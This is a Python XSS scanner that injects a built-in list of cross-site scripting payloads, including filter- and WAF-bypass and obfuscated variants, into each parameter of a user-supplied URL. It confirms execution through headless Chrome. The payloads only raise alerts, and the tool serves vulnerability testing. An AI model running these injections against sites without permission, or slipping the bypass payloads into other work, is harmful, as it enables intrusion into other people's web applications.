#!/usr/bin/env python3
"""
ShadowX Interactive Scanner - LOXS Style Interface
Created by: adce626
Real-time payload testing with visual feedback
"""

import time
import sys
import urllib.parse
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service
import requests
from bs4 import BeautifulSoup
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.table import Table
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn
from rich.live import Live
from rich.layout import Layout
from rich.align import Align
import colorama
from colorama import Fore, Back, Style
import threading
import queue
import random

class InteractiveXSSScanner:
    def __init__(self):
        self.console = Console()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        # Statistics
        self.total_payloads = 0
        self.tested_payloads = 0
        self.successful_payloads = []
        self.failed_payloads = []
        self.vulnerable_params = []
        
        # Selenium setup
        self.driver = None
        self.setup_selenium()
        
        # Payload collections
        self.basic_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '"><script>alert("XSS")</script>',
            '\'><script>alert("XSS")</script>',
            '<iframe src="javascript:alert(\'XSS\')">',
            '<body onload=alert("XSS")>',
            '<marquee onstart=alert("XSS")>',
            '<details open ontoggle=alert("XSS")>',
            '<audio src=x onerror=alert("XSS")>',
        ]
        
        self.advanced_payloads = [
            # Context breaking payloads
            '\';alert("XSS");//',
            '\";alert("XSS");//',
            '</script><script>alert("XSS")</script>',
            '</title><script>alert("XSS")</script>',
            '</textarea><script>alert("XSS")</script>',
            
            # Event handler payloads
            'onmouseover=alert("XSS")',
            'onfocus=alert("XSS") autofocus',
            'onanimationstart=alert("XSS")',
            'ontransitionend=alert("XSS")',
            
            # SVG payloads
            '<svg><animate onbegin=alert("XSS") attributeName=x dur=1s>',
            '<svg><set onbegin=alert("XSS") attributeName=x to=y>',
            
            # HTML5 payloads
            '<video><source onerror="alert(\'XSS\')">',
            '<audio controls><source onerror="alert(\'XSS\')">',
            
            # Filter bypass
            '<ScRiPt>alert("XSS")</ScRiPt>',
            '<sCrIpT>alert("XSS")</ScRiPt>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            
            # Encoded payloads
            '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E',
            '&lt;script&gt;alert("XSS")&lt;/script&gt;',
            
            # WAF bypass
            '<script>alert("XSS");</script>',
            '<script>/**/alert("XSS");</script>',
            '<script>window["alert"]("XSS")</script>',
            '<script>top["alert"]("XSS")</script>',
            
            # DOM XSS
            'javascript:alert("XSS")',
            'data:text/html,<script>alert("XSS")</script>',
            
            # Advanced obfuscation
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))</script>',
            '<script>Function("alert(\'XSS\')")();</script>',
        ]

    def setup_selenium(self):
        """Initialize Selenium WebDriver"""
        try:
            chrome_options = Options()
            chrome_options.add_argument('--headless')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--window-size=1920,1080')
            chrome_options.add_argument('--disable-web-security')
            chrome_options.add_argument('--allow-running-insecure-content')
            chrome_options.add_argument('--ignore-certificate-errors')
            
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=chrome_options)
            self.driver.set_page_load_timeout(15)
            
        except Exception as e:
            self.console.print(f"[red]خطأ في إعداد المتصفح: {e}[/red]")
            sys.exit(1)

    def display_banner(self):
        """Display interactive scanner banner"""
        banner = """
╔═══════════════════════════════════════════════════════════════╗
║   ███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗██╗  ██╗  ║
║   ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║╚██╗██╔╝  ║
║   ███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║ ╚███╔╝   ║
║   ╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║ ██╔██╗   ║
║   ███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝██╔╝ ██╗  ║
║   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝  ║
║                                                             ║
║          🎯 INTERACTIVE XSS SCANNER - LOXS STYLE            ║
║                     Created by: adce626                    ║
║              Real-time Payload Testing Interface           ║
╚═══════════════════════════════════════════════════════════════╝
        """
        
        panel = Panel(
            Text(banner, style="bold cyan"),
            title="ShadowX Interactive Scanner",
            border_style="bright_blue"
        )
        self.console.print(panel)

    def create_live_display(self, url):
        """Create live display interface like LOXS"""
        layout = Layout()
        
        layout.split_column(
            Layout(name="header", size=8),
            Layout(name="main", ratio=1),
            Layout(name="stats", size=8)
        )
        
        # Header
        header_text = f"""
[bold cyan]🎯 Target URL:[/bold cyan] {url}
[bold yellow]📊 Testing Status:[/bold yellow] Analyzing parameters and injecting payloads...
[bold green]⚡ Mode:[/bold green] Interactive Real-time Testing
        """
        layout["header"].update(Panel(header_text, title="Scan Information", border_style="blue"))
        
        return layout

    def test_payload_interactively(self, url, param, payload, payload_num, total_payloads):
        """Test single payload with live feedback like LOXS"""
        try:
            # Parse URL and parameters
            parsed_url = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed_url.query)
            
            # Inject payload into parameter
            test_params = params.copy()
            test_params[param] = [payload]
            
            # Build test URL
            new_query = urllib.parse.urlencode(test_params, doseq=True)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
            
            # Display testing status like LOXS
            status_text = f"[{payload_num:03d}/{total_payloads:03d}]"
            param_text = f"[bold yellow]{param}[/bold yellow]"
            payload_text = f"[dim]{payload[:50]}{'...' if len(payload) > 50 else ''}[/dim]"
            
            # Show current test
            self.console.print(f"{status_text} Testing {param_text}: {payload_text}", end="")
            
            # Add realistic delay like LOXS
            time.sleep(random.uniform(0.3, 0.8))
            
            # Test with requests first (fast check)
            response = self.session.get(test_url, timeout=10)
            
            # Check if payload is reflected
            if payload in response.text:
                # Selenium verification for execution
                try:
                    if self.driver:
                        self.driver.get(test_url)
                        
                        # Check for alert (XSS execution)
                        WebDriverWait(self.driver, 3).until(EC.alert_is_present())
                        alert = self.driver.switch_to.alert
                        alert_text = alert.text
                        alert.accept()
                    
                    # Success - XSS executed
                    self.console.print(f" [{Fore.GREEN}✓ VULNERABLE{Style.RESET_ALL}] - Alert triggered: {alert_text}")
                    self.successful_payloads.append({
                        'url': test_url,
                        'param': param,
                        'payload': payload,
                        'alert_text': alert_text
                    })
                    self.vulnerable_params.append(param)
                    return True
                    
                except TimeoutException:
                    # Payload reflected but no execution
                    self.console.print(f" [{Fore.YELLOW}⚠ REFLECTED{Style.RESET_ALL}] - No execution")
                    return False
                    
            else:
                # Not reflected
                self.console.print(f" [{Fore.RED}✗ FAILED{Style.RESET_ALL}] - Not reflected")
                return False
                
        except Exception as e:
            self.console.print(f" [{Fore.RED}✗ ERROR{Style.RESET_ALL}] - {str(e)}")
            return False

    def extract_parameters(self, url):
        """Extract all parameters from URL"""
        parsed_url = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed_url.query)
        return list(params.keys())

    def scan_url_interactive(self, url):
        """Main interactive scanning function like LOXS"""
        self.console.print(f"\n[bold green]🔍 Analyzing target URL...[/bold green]")
        
        # Extract parameters
        parameters = self.extract_parameters(url)
        if not parameters:
            self.console.print(f"[red]❌ No parameters found in URL[/red]")
            return
        
        self.console.print(f"[cyan]📋 Found {len(parameters)} parameters: {', '.join(parameters)}[/cyan]")
        
        # Prepare all payloads
        all_payloads = self.basic_payloads + self.advanced_payloads
        self.total_payloads = len(all_payloads) * len(parameters)
        
        self.console.print(f"[yellow]🎯 Total tests to run: {self.total_payloads}[/yellow]\n")
        
        # Start interactive testing
        self.console.print("[bold blue]═══ STARTING INTERACTIVE XSS TESTING ═══[/bold blue]\n")
        
        payload_counter = 0
        
        # Test each parameter with each payload
        for param in parameters:
            self.console.print(f"\n[bold cyan]📍 Testing parameter: {param}[/bold cyan]")
            self.console.print("─" * 60)
            
            for payload in all_payloads:
                payload_counter += 1
                self.tested_payloads += 1
                
                result = self.test_payload_interactively(url, param, payload, payload_counter, self.total_payloads)
                
                if result:
                    # Small delay to show success
                    time.sleep(0.5)
        
        # Show final results
        self.display_final_results()

    def display_final_results(self):
        """Display final scan results like LOXS"""
        self.console.print("\n" + "═" * 70)
        self.console.print("[bold green]🎉 SCAN COMPLETED[/bold green]")
        self.console.print("═" * 70)
        
        # Create results table
        table = Table(title="Scan Summary", show_header=True, header_style="bold magenta")
        table.add_column("Metric", style="cyan", no_wrap=True)
        table.add_column("Value", style="yellow")
        
        table.add_row("Total Payloads Tested", str(self.tested_payloads))
        table.add_row("Successful Injections", f"[green]{len(self.successful_payloads)}[/green]")
        table.add_row("Failed Attempts", f"[red]{self.tested_payloads - len(self.successful_payloads)}[/red]")
        table.add_row("Vulnerable Parameters", f"[red]{len(set(self.vulnerable_params))}[/red]")
        
        self.console.print(table)
        
        # Show vulnerable payloads
        if self.successful_payloads:
            self.console.print(f"\n[bold red]🚨 VULNERABILITIES FOUND:[/bold red]")
            for i, vuln in enumerate(self.successful_payloads, 1):
                panel_text = f"""
[bold yellow]Parameter:[/bold yellow] {vuln['param']}
[bold yellow]Payload:[/bold yellow] {vuln['payload']}
[bold yellow]URL:[/bold yellow] {vuln['url']}
[bold yellow]Alert Text:[/bold yellow] {vuln['alert_text']}
                """
                panel = Panel(panel_text, title=f"Vulnerability #{i}", border_style="red")
                self.console.print(panel)
        else:
            self.console.print(f"\n[green]✅ No XSS vulnerabilities detected[/green]")

    def run_interactive_scan(self, target_url):
        """Main entry point for interactive scanning"""
        colorama.init()
        
        try:
            self.display_banner()
            time.sleep(2)
            
            self.console.print(f"[bold white]🎯 Target: {target_url}[/bold white]")
            self.console.print("[bold yellow]🚀 Initializing interactive scanner...[/bold yellow]")
            time.sleep(1)
            
            self.scan_url_interactive(target_url)
            
        except KeyboardInterrupt:
            self.console.print(f"\n[yellow]⚠️ Scan interrupted by user[/yellow]")
            self.display_final_results()
        except Exception as e:
            self.console.print(f"[red]❌ Error during scan: {e}[/red]")
        finally:
            if self.driver:
                self.driver.quit()
            colorama.deinit()

def main():
    scanner = InteractiveXSSScanner()
    
    # Example usage
    target_url = input("Enter target URL: ")
    if not target_url:
        target_url = "https://httpbin.org/get?search=test&category=example"
    
    scanner.run_interactive_scan(target_url)

if __name__ == "__main__":
    main()